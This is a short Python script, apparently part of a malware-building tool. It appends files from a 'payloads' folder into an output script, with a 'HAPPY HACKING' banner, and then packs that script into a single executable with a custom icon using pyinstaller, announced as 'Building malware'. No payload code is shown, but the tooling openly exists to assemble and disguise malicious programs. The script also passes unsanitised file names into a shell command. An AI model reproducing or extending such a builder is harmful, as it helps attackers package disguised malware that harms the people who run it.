A_VERSION = 1.0
from colorama import Fore
import subprocess
import os
from time import sleep
#FUNC (ADD PAYLOAD TO FILE) (STRING) (STRING) (STRING)
def aptf(pname, fname):
    print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}\\{Fore.YELLOW}]{Fore.RESET} Adding {pname} to {fname} {Fore.YELLOW} (HAPPY HACKING) {Fore.RESET}")
    ffp = open(f"./payloads/{pname}", "r")
    fftp = open(f"./output/{fname}", "a")
    for i in ffp.readlines():
        print(f"{Fore.LIGHTGREEN_EX}{i}{Fore.RESET}")
        fftp.write(i)
        print("[%] Added line.")

def buildm(mname, micon):
    print(f"{Fore.YELLOW}[+] Building malware... ({mname}) with icon ({micon})")
    
    if not os.path.isfile(f"./output/{mname}"):
        print(f"Error: {mname} not found in 'output' folder")
        return
    elif not os.path.isfile(f"./icons/{micon}"):
        print(f"Error: {mname} not found in 'icons' folder")
        return
    subprocess.call(f"pyinstaller --onefile ./output/{mname} --icon=./icons/{micon}", shell=True)
    #print(f"pyinstaller --onefile ./output/{mname} --icon=./icons/{micon}")
    sleep(2)


